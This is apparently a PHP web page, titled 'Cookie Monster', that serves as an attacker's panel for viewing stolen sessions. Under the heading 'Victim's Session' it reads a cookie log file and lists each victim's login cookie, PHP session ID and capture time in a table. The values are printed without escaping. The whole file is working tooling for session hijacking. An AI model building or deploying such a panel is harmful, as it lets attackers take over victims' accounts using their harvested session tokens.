<?php


?>
<!DOCTYPE html>
<html>

<head>

  <meta charset="UTF-8">

  <title>Cookie Monster</title>

    <link rel="stylesheet" type="text/css" href="css/comments.css">
    <script src="js/prefixfree.min.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

</head>

<body>
<div class='container'>
<h1 style="margin-left:33%">Victim's Session</h1>
<table class="table">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Login Cookie</th>
      <th scope="col">Php SessionId</th>
      <th scope="col">Cookie Time</th>

    </tr>
  </thead>


  <tbody>
    
    <?php
            $handle = fopen("cookies/cookie.txt", "r");
            $count=1;
            while (($line = fgets($handle)) !== false) {
              if(isset(explode(" ",$line)[0][1])){
                $login = explode("=",explode(" ",$line)[0])[1];
                $phpsession = explode("=",explode(" ",$line)[1])[1];
                $time = explode(" ",$line)[2];

                echo '<tr>
                <th scope="row">'.$count.'</th>
                <td>'.$login.'</td>
                <td>'.$phpsession.'</td>
                <td>'.$time.'</td>

              </tr>';
              $count++;
              }
            }
    ?>

  </tbody>
</table>
</div>
</body>

</html>
